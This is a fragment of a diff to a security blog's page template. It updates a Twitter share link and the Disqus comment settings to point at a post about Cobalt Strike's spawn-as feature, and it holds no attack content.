+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f06%2fcobalt-strike---spawn-as%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -956,9 +899,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2017\/05\/playing-with-cuckoo\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2017\/06\/cobalt-strike---spawn-as\/';
           
-            this.page.identifier = '\/2017\/05\/playing-with-cuckoo\/'
+            this.page.identifier = '\/2017\/06\/cobalt-strike---spawn-as\/'
           
         };
         (function() {
